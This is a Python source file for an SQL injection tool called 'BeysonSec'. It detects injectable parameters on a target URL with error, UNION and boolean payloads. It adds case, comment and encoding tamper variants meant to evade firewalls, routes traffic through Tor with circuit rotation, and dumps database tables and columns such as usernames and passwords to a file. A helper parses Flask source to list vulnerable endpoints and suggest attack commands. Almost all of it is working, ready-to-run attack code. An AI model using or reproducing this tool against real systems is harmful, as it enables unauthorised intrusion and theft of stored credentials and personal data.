#!/usr/bin/env python3
import requests
import sys
import threading
import argparse
import string
import time
import random
import re
import os
from queue import Queue
from urllib.parse import urlencode, quote

BANNER = r"""
█   █                  ▄▀▀▀▄  ▀              ▀█        ▄▀▀▀▄ ▄▀▀▀▄ ▀█▀   ▀█▀
█   █ ▄▀▀▀▄ ▀█▄▀▄ █  █ ▀▄▄▄  ▀█  █▀▄▀▄ ▀█▀▀▄  █  ▄▀▀▀▄ ▀▄▄▄  █   █  █     █
▀▄ ▄▀ █▀▀▀▀  █  ▀ ▀▄▄█ ▄   █  █  █ █ █  █▄▄▀  █  █▀▀▀▀ ▄   █ ▀▄▄▄▀  █  ▄  █
  ▀    ▀▀▀  ▀▀▀      █  ▀▀▀  ▀▀▀ ▀ ▀ ▀  █    ▀▀▀  ▀▀▀   ▀▀▀     ▀▀ ▀▀▀▀▀ ▀▀▀
                  ▀▀▀                  ▀▀▀

Extreemly Simple SQL injector Written In Python
            ==--BeysonSec--=
"""

ERROR_SIGS = [
    "sql syntax", "sql error", "operationalerror", "sqlite",
    "mysql_fetch", "unclosed quotation", "odbc driver", "ora-01756",
    "pg_query", "you have an error in your sql", "warning: mysql",
    "invalid query", "quoted string not properly terminated"
]

PAYLOADS = [
    # error
    "'",
    "' --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 1=1#",
    '" OR "1"="1',
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    # union
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # blind boolean
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SLEEP(2)--",
    "1 AND 1=1",
    "1 AND 1=2",
]

# ASCII-only markers — no multi-byte encoding surprises across numeric/string
# injection styles or HTTP stacks
MARKER_S = "~~SQLIS~~"
MARKER_E = "~~SQLIE~~"

results = []
lock    = threading.Lock()
q       = Queue()


# ── rate limiter ──────────────────────────────────────────────────────────
_req_count    = [0]
_req_lock     = threading.Lock()
_req_next_lim = [random.randint(10, 20)]

def _do_rate_pause():
    do_pause = False
    with _req_lock:
        _req_count[0] += 1
        if _req_count[0] >= _req_next_lim[0]:
            _req_count[0]    = 0
            _req_next_lim[0] = random.randint(10, 20)
            do_pause = True
    if do_pause:
        sleep_t = round(random.uniform(1.0, 2.0), 2)
        with lock:
            print(f"\033[93m  [!] WOAH THERE, quite the requests how about we turn those down for a bit, yeah?\033[0m")
        time.sleep(sleep_t)


# ── tamper scripts ────────────────────────────────────────────────────────
def tamper_randomcase(p: str) -> str:
    return ''.join(
        (c.upper() if random.random() > 0.5 else c.lower()) if c.isalpha() else c
        for c in p
    )

def tamper_space2comment(p: str) -> str:
    return p.replace(' ', '/**/')

def tamper_urlencoded(p: str) -> str:
    return quote(p, safe='')

def tamper_jittery(p: str) -> str:
    return tamper_space2comment(tamper_randomcase(p))

def tamper_jumbled(p: str) -> str:
    return tamper_urlencoded(tamper_jittery(p))

TAMPER_MAP = {
    '1': ('randomcase',    tamper_randomcase),
    '2': ('space2comment', tamper_space2comment),
    '3': ('urlencoded',    tamper_urlencoded),
    '4': ('jittery',       tamper_jittery),
    '5': ('jumbled',       tamper_jumbled),
}

def apply_tampers(payloads: list, keys: list) -> list:
    seen = set(payloads)
    out  = list(payloads)
    for k in keys:
        _, fn = TAMPER_MAP[k]
        for p in payloads:
            variant = fn(p)
            if variant not in seen:
                seen.add(variant)
                out.append(variant)
    return out


# ── lazy-mode prompt helper ───────────────────────────────────────────────
def ask(prompt: str, args, default: str = 'y') -> str:
    if args.lazy_mode:
        print(f"  {prompt} \033[90m[lazy-mode] → {default}\033[0m")
        return default
    ans = input(f"  {prompt} ").strip().lower()
    return ans if ans else default


# ── vuln server static analyser ───────────────────────────────────────────
def analyse_vuln_server(path: str) -> dict:
    """
    Statically analyse a Flask server source for SQL injection points.

    Extracts:
      - DB backend (sqlite / mysql / postgres)
      - All table names (CREATE TABLE + FROM clauses)
      - Per-endpoint: route, methods, param, injection type, column count, tables

    Returns a dict: {path, db_type, tables, endpoints} or {error: ...}.
    """
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            src = f.read()
    except OSError as e:
        return {'error': str(e)}

    # ── detect DB backend ──
    db_type = 'unknown'
    if 'import sqlite3' in src or 'sqlite3.connect' in src:
        db_type = 'sqlite'
    elif any(x in src for x in ('import mysql', 'mysql.connector', 'pymysql', 'MySQLdb')):
        db_type = 'mysql'
    elif any(x in src for x in ('import psycopg2', 'postgresql', 'asyncpg')):
        db_type = 'postgres'
    elif any(x in src for x in ('pyodbc', 'pymssql', 'SQL Server')):
        db_type = 'mssql'

    # ── collect all table names ──
    all_tables = []
    _seen_t    = set()
    def _add_table(name):
        low = name.lower()
        if low not in _seen_t and low not in ('information_schema', 'dual', 'sysobjects'):
            _seen_t.add(low)
            all_tables.append(name)

    for m in re.finditer(
            r'CREATE\s+TABLE\s+(?:IF\s+NOT\s+EXISTS\s+)?[`"\']?(\w+)[`"\']?',
            src, re.IGNORECASE):
        _add_table(m.group(1))
    for m in re.finditer(r'\bFROM\s+(\w+)', src, re.IGNORECASE):
        _add_table(m.group(1))

    # ── parse endpoints ──
    route_re = re.compile(
        r'@\w+\.route\(\s*["\']([^"\']+)["\']\s*(?:,\s*methods\s*=\s*\[([^\]]*)\])?\s*\)',
        re.DOTALL
    )
    route_matches = list(route_re.finditer(src))
    endpoints = []

    for idx, rm in enumerate(route_matches):
        route      = rm.group(1)
        meth_raw   = rm.group(2) or ''
        methods    = re.findall(r'["\'](\w+)["\']', meth_raw) or ['GET']

        body_start = rm.end()
        body_end   = route_matches[idx + 1].start() if idx + 1 < len(route_matches) else len(src)
        body       = src[body_start:body_end]

        # collect injectable params from request.args / request.form
        get_params  = re.findall(r'request\.args\.get\(\s*["\'](\w+)["\']', body)
        post_params = re.findall(r'request\.form\.get\(\s*["\'](\w+)["\']', body)

        # find SQL f-strings (double-quoted; single-quoted handled below)
        sql_hits = []
        for m in re.finditer(r'\bf"([^"]*)"', body, re.DOTALL):
            c = m.group(1)
            if re.search(r'\b(?:SELECT|INSERT|UPDATE|DELETE)\b', c, re.IGNORECASE) and '{' in c:
                sql_hits.append(c)
        for m in re.finditer(r"\bf'([^']*)'", body, re.DOTALL):
            c = m.group(1)
            if re.search(r'\b(?:SELECT|INSERT|UPDATE|DELETE)\b', c, re.IGNORECASE) and '{' in c:
                sql_hits.append(c)

        for sql in sql_hits:
            # column count from SELECT clause
            cm = re.search(r'SELECT\s+(.*?)\s+FROM\b', sql, re.IGNORECASE | re.DOTALL)
            ncols = 0
            if cm:
                col_part = cm.group(1).strip()
                ncols = -1 if col_part == '*' else len([c for c in col_part.split(',') if c.strip()])

            # tables in this query
            qtables = [t for t in re.findall(r'\bFROM\s+(\w+)', sql, re.IGNORECASE)
                       if t.lower() not in ('information_schema', 'dual')]

            # analyse each param against this SQL
            all_params = [(p, 'GET') for p in get_params] + [(p, 'POST') for p in post_params]
            for param, http_method in all_params:
                if f'{{{param}}}' not in sql:
                    continue
                # injection type: is the placeholder inside SQL string quotes?
                in_quotes = bool(re.search(rf"['\"][^'\"]*\{{{re.escape(param)}\}}[^'\"]*['\"]", sql))
                inj_type  = 'string' if in_quotes else 'numeric'

                endpoints.append({
                    'route':       route,
                    'methods':     methods,
                    'param':       param,
                    'http_method': http_method,
                    'inj_type':    inj_type,
                    'ncols':       ncols,
                    'tables':      qtables,
                    'sql':         sql.strip(),
                })

    return {
        'path':      path,
        'db_type':   db_type,
        'tables':    all_tables,
        'endpoints': endpoints,
    }


def print_vuln_server_report(analysis: dict):
    if 'error' in analysis:
        print(f"\033[91m  [vuln-server] error: {analysis['error']}\033[0m")
        return

    C_HEAD  = "\033[93m"   # yellow
    C_HIT   = "\033[92m"   # green
    C_DIM   = "\033[90m"   # grey
    C_RESET = "\033[0m"

    print(f"\n{C_HEAD}════ VULN SERVER ANALYSIS ════{C_RESET}")
    print(f"  source  : {analysis['path']}")
    print(f"  backend : {C_HIT}{analysis['db_type']}{C_RESET}")

    if analysis['tables']:
        print(f"  tables  : {', '.join(analysis['tables'])}")

    eps = analysis['endpoints']
    if not eps:
        print("  [!] no injectable endpoints detected in source")
        print()
        return

    # deduplicate by (route, param)
    seen_ep  = set()
    deduped  = []
    for ep in eps:
        key = (ep['route'], ep['param'])
        if key not in seen_ep:
            seen_ep.add(key)
            deduped.append(ep)

    print(f"\n  {'METHOD':<8} {'ROUTE':<22} {'PARAM':<14} {'TYPE':<9} {'COLS':<6} TABLE")
    print(f"  {'──────':<8} {'─────':<22} {'─────':<14} {'────':<9} {'────':<6} ─────")
    for ep in deduped:
        mstr    = ','.join(ep['methods'])
        ncstr   = str(ep['ncols']) if ep['ncols'] > 0 else '?'
        tstr    = ','.join(ep['tables']) if ep['tables'] else '?'
        icolor  = C_HIT if ep['inj_type'] == 'numeric' else "\033[96m"
        print(f"  {mstr:<8} {ep['route']:<22} {ep['param']:<14} {icolor}{ep['inj_type']:<9}{C_RESET} {ncstr:<6} {tstr}")

    print(f"\n  {C_HEAD}SUGGESTED COMMANDS:{C_RESET}")
    for ep in deduped:
        post   = " --post"             if 'POST' in ep['methods']  else ""
        tbl    = f" --dump-table {ep['tables'][0]}" if ep['tables'] else ""
        note   = (f"  {C_DIM}# {ep['ncols']} cols · {ep['inj_type']} · {analysis['db_type']}{C_RESET}"
                  if ep['ncols'] > 0 else "")
        print(f"  sqli.py -u http://TARGET{ep['route']} -p {ep['param']}{post} --dump{tbl}{note}")
    print()


# ── extra payloads loader ─────────────────────────────────────────────────
def load_extra_payloads(base_path: str) -> dict:
    """
    Load payloads from the extra_payloads directory structure:

      base_path/
      ├── union_based      (or union_based.txt)
      ├── error_based      (or error_based.txt)
      ├── blind_boolean    (or blind_boolean.txt)
      └── custom/          auto-loads every file in this folder

    Returns {category: [payloads]} — comment lines (# ...) are stripped.
    """
    def _read(path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [l.rstrip('\n') for l in f
                        if l.strip() and not l.lstrip().startswith('#')]
        except OSError:
            return []

    result = {}

    for name in ('union_based', 'error_based', 'blind_boolean'):
        for candidate in (name, name + '.txt',
                          name.replace('_', ' '), name.replace('_', ' ') + '.txt'):
            fpath = os.path.join(base_path, candidate)
            if os.path.isfile(fpath):
                result[name] = _read(fpath)
                break
        else:
            result[name] = []

    custom_dir = os.path.join(base_path, 'custom')
    custom     = []
    if os.path.isdir(custom_dir):
        for fname in sorted(os.listdir(custom_dir)):
            if fname.startswith('.'):
                continue
            fpath = os.path.join(custom_dir, fname)
            if os.path.isfile(fpath):
                loaded = _read(fpath)
                if loaded:
                    custom.extend(loaded)
    result['custom'] = custom

    return result


def parse_args():
    p = argparse.ArgumentParser(
        description="sqli — fast error/blind injector",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("-u", "--url",
                   required=True,
                   help="target url\n  ex: http://target.com/page.php")
    p.add_argument("-p", "--param",
                   default="id",
                   help="vulnerable parameter (default: id)")
    p.add_argument("-t", "--threads",
                   type=int, default=20,
                   help="thread count (default: 20)")
    p.add_argument("--timeout",
                   type=int, default=5,
                   help="request timeout seconds (default: 5)")
    p.add_argument("--post",
                   action="store_true",
                   help="use POST instead of GET")
    p.add_argument("--cookie",
                   default=None,
                   help="cookie string\n  ex: \"session=abc123\"")
    p.add_argument("--header",
                   action="append",
                   dest="headers",
                   metavar="NAME:VALUE",
                   help="extra header (repeatable)\n  ex: --header \"X-Forwarded-For: 127.0.0.1\"")
    p.add_argument("--payload-file",
                   default=None,
                   help="path to newline-separated payload list\n  overrides built-in payloads")
    p.add_argument("--no-banner",
                   action="store_true",
                   help="skip the ascii banner")
    p.add_argument("-o", "--output",
                   default=None,
                   help="write hits to file")
    p.add_argument("--tor",
                   action="store_true",
                   help="route traffic through Tor SOCKS5\n  (default 127.0.0.1:9050, needs: pip install requests[socks])")
    p.add_argument("--tor-port",
                   type=int, default=9050,
                   help="Tor SOCKS5 port (default: 9050)")
    p.add_argument("--tor-control-port",
                   type=int, default=9051,
                   help="Tor control port for NEWNYM circuit rotation (default: 9051)")
    p.add_argument("--rotate",
                   type=int, default=0,
                   help="rotate Tor circuit every N requests in dump mode\n  (0 = disabled)")
    p.add_argument("-dump", "--dump",
                   action="store_true",
                   help="attempt data extraction after detection:\n"
                        "  auto-detects numeric/string injection + db type,\n"
                        "  reflected UNION extraction, blind fallback")
    p.add_argument("--dump-table",
                   default=None,
                   help="with -dump: dump rows from a specific table\n  (e.g. --dump-table users)")
    p.add_argument("--dump-columns",
                   default=None,
                   help="with --dump-table: comma-separated columns\n  (e.g. --dump-columns username,password)")
    p.add_argument("--lazy-mode",
                   action="store_true",
                   help="batch mode — auto-accept all prompts and run unattended")
    p.add_argument("--tamper",
                   choices=['on', 'off'],
                   default='off',
                   help="tamper encoding variants\n"
                        "  --tamper=on   prompt to pick encoding scripts\n"
                        "  --tamper=off  no encoding (default)\n"
                        "  scripts: randomcase, space2comment, urlencoded, jittery, jumbled")
    # ── new ──
    p.add_argument("--vuln-server",
                   default=None,
                   metavar="PATH",
                   help="path to a server source file for static analysis\n"
                        "  extracts: routes, injection params, tables, column counts\n"
                        "  prints suggested commands and continues with the scan")
    p.add_argument("--extra-payloads",
                   nargs='?',
                   const="extra_payloads",
                   default=None,
                   metavar="DIR",
                   help="load additional payloads from directory (default: ./extra_payloads)\n"
                        "  DIR/union_based     UNION-based payloads\n"
                        "  DIR/error_based     error-based payloads\n"
                        "  DIR/blind_boolean   boolean blind payloads\n"
                        "  DIR/custom/         auto-loads all files in this folder\n"
                        "  comment lines (#) are stripped; deduped against base list")
    return p.parse_args()


def build_headers(args) -> dict:
    h = {"User-Agent": "Mozilla/5.0"}
    if args.cookie:
        h["Cookie"] = args.cookie
    if args.headers:
        for raw in args.headers:
            if ":" in raw:
                k, v = raw.split(":", 1)
                h[k.strip()] = v.strip()
    return h


def build_proxies(args) -> dict:
    if not args.tor:
        return None
    socks = f"socks5h://127.0.0.1:{args.tor_port}"
    return {"http": socks, "https": socks}


def tor_newnym(args):
    import socket
    try:
        s = socket.create_connection(("127.0.0.1", args.tor_control_port), timeout=5)
        s.sendall(b'AUTHENTICATE ""\r\n')
        s.recv(1024)
        s.sendall(b"SIGNAL NEWNYM\r\n")
        s.recv(1024)
        s.sendall(b"QUIT\r\n")
        s.close()
        time.sleep(1)
        print("  [tor] circuit rotated (NEWNYM)")
    except Exception as e:
        print(f"  \033[91m[tor]\033[0m rotation failed: {e}")


def load_payloads(path: str) -> list:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [ln.rstrip("\n") for ln in f if ln.strip()]


def check_error(text: str) -> bool:
    low = text.lower()
    return any(sig in low for sig in ERROR_SIGS)


def send(args, session, params, timeout=None):
    _do_rate_pause()
    if args.post:
        return session.post(args.url, data=params, timeout=timeout or args.timeout)
    return session.get(f"{args.url}?{urlencode(params)}", timeout=timeout or args.timeout)


def inject(payload: str, session: requests.Session, args):
    try:
        r = send(args, session, {args.param: payload})
        hit      = check_error(r.text)
        code     = r.status_code
        length   = len(r.text)
        full_url = r.url
        with lock:
            tag  = "\033[92m[HIT]\033[0m" if hit else "[ -- ]"
            print(f"{tag} {code} len={length:>6}  payload: {payload!r}")
            if hit:
                results.append((payload, full_url))
    except requests.RequestException as e:
        with lock:
            print(f"\033[91m[ERR]\033[0m {payload!r} → {e}")


def worker(args):
    s = requests.Session()
    s.headers.update(build_headers(args))
    s.proxies = build_proxies(args) or {}
    while True:
        p = q.get()
        if p is None:
            break
        inject(p, s, args)
        q.task_done()


def union_query(ncols: int, expr: str, idx_col: int) -> str:
    cols = ["NULL"] * ncols
    cols[idx_col] = expr
    return f"' UNION SELECT {','.join(cols)}--"


def find_column_count(args, s):
    for n in range(1, 65):
        try:
            r = send(args, s, {args.param: f"1 ORDER BY {n}-- "})
            if r.status_code >= 500 or check_error(r.text):
                return n - 1 if n > 1 else 0
        except requests.RequestException:
            continue
    return 0


def union_extract(args, s, expr, idx_first=1, ncols=None):
    positions = [idx_first] if ncols else range(1, 10)
    for pos in positions:
        cols = ["NULL"] * (ncols if ncols else pos)
        cols[pos - 1] = expr
        payload = f"' UNION SELECT {','.join(cols)}--"
        try:
            r = send(args, s, {args.param: payload})
            if not check_error(r.text) and r.status_code < 400:
                probe = payload.replace(expr, f"CONCAT('{MARKER_S}',({expr}),'{MARKER_E}')")
                r2    = send(args, s, {args.param: probe})
                body  = r2.text
                if MARKER_S in body and MARKER_E in body:
                    return body.split(MARKER_S, 1)[1].split(MARKER_E, 1)[0].strip(), pos
        except requests.RequestException:
            continue
    return None, None


def timeblind_extract(args, s, expr, max_len=64):
    charset    = string.printable.strip()
    out        = ""
    sleep_secs = max(1, args.timeout // 2)
    for i in range(1, max_len + 1):
        found = None
        for ch in charset:
            payload = (f"' AND IF(ASCII(SUBSTRING(({expr}),{i},1))={ord(ch)},"
                       f"SLEEP({sleep_secs}),0)--")
            try:
                t0 = time.time()
                send(args, s, {args.param: payload}, timeout=args.timeout * 3)
                if time.time() - t0 >= sleep_secs:
                    found = ch
                    break
            except requests.RequestException:
                found = ch
                break
        if not found:
            break
        out += found
        sys.stdout.write(f"\r  [blind] {expr[:30]}… = {out}")
        sys.stdout.flush()
    print()
    return out or None

_DB_PROBES = [
    ("sqlite", "pipe", "sqlite_version()"),
    ("mysql",  "fn",   "version()"),
    ("pgsql",  "pipe", "version()"),
    ("mssql",  "fn",   "@@version"),
]
_INJ_PREFIXES = [
    ("numeric", "0"),
    ("string",  "'"),
]


def probe_injection_style(args, s, ncols: int) -> dict:
    for style, prefix in _INJ_PREFIXES:
        for db_label, concat, ver_fn in _DB_PROBES:
            for col_idx in range(1, ncols + 1):
                cols = ["NULL"] * ncols
                if concat == "pipe":
                    cols[col_idx - 1] = f"'{MARKER_S}'||({ver_fn})||'{MARKER_E}'"
                else:
                    cols[col_idx - 1] = f"CONCAT('{MARKER_S}',({ver_fn}),'{MARKER_E}')"
                payload = f"{prefix} UNION SELECT {','.join(cols)}--"
                try:
                    r = send(args, s, {args.param: payload})
                    if r.status_code < 400 and MARKER_S in r.text and MARKER_E in r.text:
                        ver = r.text.split(MARKER_S, 1)[1].split(MARKER_E, 1)[0].strip()
                        return {"style": style, "db": db_label, "concat": concat,
                                "col": col_idx, "version": ver,
                                "ncols": ncols, "prefix": prefix}
                except requests.RequestException:
                    continue
    return None


def extract_scalar(args, s, expr: str, probe: dict) -> str:
    ncols   = probe["ncols"]
    col_idx = probe["col"]
    prefix  = probe["prefix"]
    concat  = probe["concat"]
    cols    = ["NULL"] * ncols
    if concat == "pipe":
        cols[col_idx - 1] = f"'{MARKER_S}'||({expr})||'{MARKER_E}'"
    else:
        cols[col_idx - 1] = f"CONCAT('{MARKER_S}',({expr}),'{MARKER_E}')"
    payload = f"{prefix} UNION SELECT {','.join(cols)}--"
    try:
        r = send(args, s, {args.param: payload})
        if r.status_code < 400 and MARKER_S in r.text and MARKER_E in r.text:
            return r.text.split(MARKER_S, 1)[1].split(MARKER_E, 1)[0].strip()
    except requests.RequestException:
        pass
    return None


def run_dump(args):
    print("\n\033[93m════ DUMP MODE ════\033[0m")
    s = requests.Session()
    s.headers.update(build_headers(args))
    s.proxies = build_proxies(args) or {}

    req_counter = [0]
    def maybe_rotate():
        if args.rotate:
            req_counter[0] += 1
            if req_counter[0] % args.rotate == 0:
                tor_newnym(args)

    ncols = find_column_count(args, s)
    if ncols <= 0:
        print("  [!] UNION column discovery failed — dropping to time-based blind")
        table = args.dump_table or "users"
        col   = (args.dump_columns or "id").split(",")[0].strip()
        v = timeblind_extract(args, s, f"SELECT {col} FROM {table} LIMIT 1")
        if v:
            print(f"  [blind] {table}.{col}[0] = {v}")
        return

    print(f"  [+] UNION columns detected: {ncols}")
    maybe_rotate()

    print("  [*] probing injection style and backend...")
    probe = probe_injection_style(args, s, ncols)
    maybe_rotate()

    if not probe:
        print("  [!] no reflected UNION column — dropping to time-based blind")
        table = args.dump_table or "users"
        col   = (args.dump_columns or "id").split(",")[0].strip()
        v = timeblind_extract(args, s, f"SELECT {col} FROM {table} LIMIT 1")
        if v:
            print(f"  [blind] {table}.{col}[0] = {v}")
        return

    print(f"  [+] style   : {probe['style']} injection  (prefix: {probe['prefix']!r})")
    print(f"  [+] backend : {probe['db']}  (version: {probe['version']})")
    print(f"  [+] reflects in column {probe['col']}")

    db = probe["db"]

    if db == "sqlite":
        tables_raw = extract_scalar(
            args, s,
            "SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'",
            probe)
        maybe_rotate()
        if tables_raw:
            print(f"  [+] tables  : {tables_raw}")
        else:
            print("  [!] could not list tables from sqlite_master")

        table = args.dump_table
        if not table:
            return

        if args.dump_columns:
            col_list = [c.strip() for c in args.dump_columns.split(",") if c.strip()]
        else:
            cols_raw = extract_scalar(
                args, s,
                f"SELECT group_concat(name,',') FROM pragma_table_info('{table}')",
                probe)
            maybe_rotate()
            if not cols_raw:
                print(f"  [!] could not enumerate columns for {table}")
                return
            col_list = [c.strip() for c in cols_raw.split(",") if c.strip()]
            print(f"  [+] columns in {table}: {','.join(col_list)}")

        concat_expr = "||':'||".join(col_list)
        rows_raw = extract_scalar(
            args, s,
            f"SELECT group_concat({concat_expr}, char(10)) FROM {table}",
            probe)
        maybe_rotate()

        rows_out = []
        if rows_raw:
            print(f"\n  [+] dump of {table} ({','.join(col_list)}):")
            for row in rows_raw.split("\n"):
                print(f"      {row}")
                rows_out.append(row)
        else:
            print(f"  [!] dump of {table} returned nothing")

        if args.output and rows_out:
            with open(args.output, "a") as f:
                f.write(f"## dump {table} ({','.join(col_list)}) @ {args.url}\n")
                for row in rows_out:
                    f.write(row + "\n")
            print(f"\n  dump appended → {args.output}")
        return

    db_fn  = "database()"     if db == "mysql" else "current_database()"
    usr_fn = "user()"         if db == "mysql" else "current_user()"

    db_name_val = extract_scalar(args, s, db_fn,  probe);  maybe_rotate()
    user_val    = extract_scalar(args, s, usr_fn, probe);  maybe_rotate()
    if db_name_val:
        print(f"  [+] database() = {db_name_val}")
    if user_val:
        print(f"  [+] user()     = {user_val}")

    db_name = db_name_val or ""
    table   = args.dump_table
    columns = [c.strip() for c in args.dump_columns.split(",")] if args.dump_columns else None

    if not table:
        tables_val = extract_scalar(
            args, s,
            f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
            f"WHERE table_schema='{db_name}'", probe)
        maybe_rotate()
        if tables_val:
            print(f"  [+] tables in '{db_name}': {tables_val}")
            return
        print("  [!] could not enumerate tables (permissions or WAF)")
        return

    if not columns:
        cols_val = extract_scalar(
            args, s,
            f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
            f"WHERE table_name='{table}'", probe)
        maybe_rotate()
        if not cols_val:
            print(f"  [!] could not enumerate columns for {table}")
            return
        columns = cols_val.split(",")
        print(f"  [+] columns in {table}: {cols_val}")

    usable   = columns[:ncols]
    conc     = f"CONCAT_WS(0x3a,{','.join(usable)})"
    rows_val = extract_scalar(
        args, s,
        f"SELECT GROUP_CONCAT({conc} SEPARATOR 0x0a) FROM {table}", probe)
    maybe_rotate()

    rows_out = []
    if rows_val:
        print(f"\n  [+] dump of {table} ({','.join(usable)}):")
        for row in rows_val.split("\n"):
            print(f"      {row}")
            rows_out.append(row)
    else:
        print(f"  [!] GROUP_CONCAT dump failed — trying time-based blind")
        for col in usable[:2]:
            v = timeblind_extract(args, s, f"SELECT {col} FROM {table} LIMIT 1")
            if v:
                print(f"  [blind] {table}.{col}[0] = {v}")
                rows_out.append(v)

    if args.output and rows_out:
        with open(args.output, "a") as f:
            f.write(f"## dump {table} ({','.join(usable)}) @ {args.url}\n")
            for row in rows_out:
                f.write(row + "\n")
        print(f"\n  dump appended → {args.output}")


def main():
    args = parse_args()

    if not args.no_banner:
        print(BANNER)

    if args.tor:
        try:
            import socks  # noqa: F401
        except ImportError:
            print("\033[91m[!] --tor requires PySocks: pip install requests[socks]\033[0m")
            sys.exit(1)

    if args.vuln_server:
        analysis = analyse_vuln_server(args.vuln_server)
        print_vuln_server_report(analysis)

    payloads = load_payloads(args.payload_file) if args.payload_file else PAYLOADS

    if args.extra_payloads is not None:
        base = args.extra_payloads
        if not os.path.isdir(base):
            print(f"\033[91m  [!] --extra-payloads: directory not found: {base}\033[0m")
        else:
            extras    = load_extra_payloads(base)
            seen_set  = set(payloads)
            before    = len(payloads)
            for category, plist in extras.items():
                added = 0
                for p in plist:
                    if p not in seen_set:
                        seen_set.add(p)
                        payloads.append(p)
                        added += 1
                if added:
                    print(f"  extra-payloads [{category}]: +{added}")
            if len(payloads) > before:
                print(f"  extra-payloads total  : {before} → {len(payloads)}")
            print()

    method = "POST" if args.post else "GET"
    print(f"  target   : {args.url}")
    print(f"  param    : {args.param}")
    print(f"  method   : {method}")
    print(f"  threads  : {args.threads}")
    print(f"  timeout  : {args.timeout}s")
    print(f"  tor      : {'socks5h://127.0.0.1:%d' % args.tor_port if args.tor else 'off'}")
    print(f"  dump     : {'on' if args.dump else 'off'}")
    print(f"  lazy-mode: {'on' if args.lazy_mode else 'off'}")
    print(f"  tamper   : {args.tamper}")

    # ── tamper prompt ──
    if args.tamper == 'on':
        print()
        ans = ask(
            "[?] Would You Like To Try Different Encodings Of The Same Payloads For This Session Only [y/n]:",
            args
        )
        if ans == 'y':
            print("\n  TAMPER SCRIPTS:")
            print("    [1] randomcase     randomizes letter case     (SeLeCt * FrOm UsErS)")
            print("    [2] space2comment  space    /**/              (SELECT/**/1/**/FROM/**/users)")
            print("    [3] urlencoded     full url encoding          (%27OR%271%27%3D%271)")
            print("    [4] jittery        randomcase it and /* it or something")
            print("    [5] jumbled        Best For Waf Heavy Environments And Dont Want To Understand The Payloads You're Sending'")
            print("    [6] all\n")
            sel = ask("  Select tampers [1-6, comma-separated, default: 6]:", args, default='6')
            if '6' in sel or not sel.strip():
                keys = list(TAMPER_MAP.keys())
            else:
                keys = [k.strip() for k in sel.split(',') if k.strip() in TAMPER_MAP]
            if keys:
                before   = len(payloads)
                payloads = apply_tampers(payloads, keys)
                names    = [TAMPER_MAP[k][0] for k in keys]
                print(f"\n  tampers  : {', '.join(names)}")
                print(f"  payloads : {before} → {len(payloads)}")

    print(f"\n  payloads : {len(payloads)}\n")

    workers = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args,), daemon=True)
        t.start()
        workers.append(t)

    for p in payloads:
        q.put(p)

    q.join()

    for _ in workers:
        q.put(None)
    for t in workers:
        t.join()

    print(f"\n  scan done — \033[92m{len(results)} hit(s)\033[0m")
    for p, u in results:
        print(f"  → {u}")

    if args.output and results and not args.dump:
        with open(args.output, "w") as f:
            for p, u in results:
                f.write(f"{p}\t{u}\n")
        print(f"\n  hits written → {args.output}")

    if args.dump and results:
        run_dump(args)
    elif args.dump and not results:
        print("\n  [dump] no confirmed hits skipping dump (error-based detection failed)")


if __name__ == "__main__":
    main()